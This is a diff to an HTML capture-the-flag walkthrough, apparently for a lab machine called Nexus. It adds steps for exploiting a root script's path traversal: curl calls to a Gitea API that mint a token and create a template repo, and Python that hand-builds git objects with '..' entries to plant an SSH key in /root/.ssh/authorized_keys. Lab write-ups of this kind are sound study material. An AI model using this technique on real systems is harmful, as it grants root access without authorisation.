@@ -308,17 +308,33 @@ if __name__ == '__main__':
 <p><code>filepath</code> comes straight from <code>git ls-tree</code> with zero sanitization, then flows into <code>os.path.join(stage_path, filepath)</code>, which happily walks <code>..</code> sequences right out of the staging directory. A tree entry literally named <code>../../../../../root/.ssh/authorized_keys</code> gets written to the real path — and since the script runs as root, the write goes through.</p>
 <p>Normally you couldn't get away with this — the standard <code>git</code> client refuses to let a tree entry contain <code>..</code>. <code>git add</code>, <code>git commit</code>, even <code>git update-index --cacheinfo</code>, all validate and reject it. The way around it is to skip the Git client entirely and hand-build the raw blob/tree/commit objects directly, since nothing at that layer checks path safety — only the porcelain commands do.</p>
 
-<p>We then create an SSH key.</p>
+<p>We then create an SSH key and make a API call to gitea to have a token created. We also make the token a variable we'll be using next.</p>
 <pre><code>ssh-keygen -t ed25519 -f /tmp/.k -N ''
 
-curl -X POST http://localhost:3000/api/v1/user/repos \
-  -H "Authorization: token $TOKEN" -H "Content-Type: application/json" \
+curl -X POST http://git.nexus.htb/api/v1/users/jones/tokens \
+  -H "Content-Type: application/json" \
+  -u "<username>:<password>" \
+  -d '{"name":"newtoken","scopes":["write:user","write:repository"]}'
+</code></pre>
+<img src="https://i.imgur.com/W7wqpAR.png" alt="Generating the SSH key and using the Gitea API to create and template-flag the repo" />
+
+<p>We then make further API calls to create the malicious repo.</p>
+<pre><code>
+  curl -X POST http://localhost:3000/api/v1/user/repos \
+  -H "Authorization: token $TOKEN" \
+  -H "Content-Type: application/json" \
   -d '{"name":"rce","private":false}'
 
+{"id": 2, "name": "rce", "full_name": "jones/rce", ...}
+
+# Mark as template
 curl -X PATCH http://localhost:3000/api/v1/repos/jones/rce \
-  -H "Authorization: token $TOKEN" -H "Content-Type: application/json" \
-  -d '{"template":true}'</code></pre>
-<img src="https://i.imgur.com/W7wqpAR.png" alt="Generating the SSH key and using the Gitea API to create and template-flag the repo" />
+  -H "Authorization: token $TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{"template":true}'
+
+{"template": true, ...}
+<pre><code>
 
 <p>Created the malicious git repo, then found a script that'll allow for directory traversal — writes blob/tree/commit objects directly into <code>.git/objects/</code>, chains <code>..</code> tree entries around the <code>authorized_keys</code> blob, and manually points <code>refs/heads/main</code> at the crafted commit:</p>
 <pre><code>#!/usr/bin/env python3  
@@ -360,6 +376,7 @@ sha=write_obj(c.encode(),"commit")
 os.makedirs(os.path.join(".git","refs","heads"),exist_ok=True)  
 open(os.path.join(".git","refs","heads","main"),"w").write(sha+"\n")  
 print("Done: "+sha)</code></pre>
+</p>Initializing the local repo and setting the remote before crafting the objects</p>
 <img src="images/nexus/15-malicious-repo-init.jpg" alt="Initializing the local repo and setting the remote before crafting the objects" />
 
 <p>Then run <code>git push origin main</code>.</p>
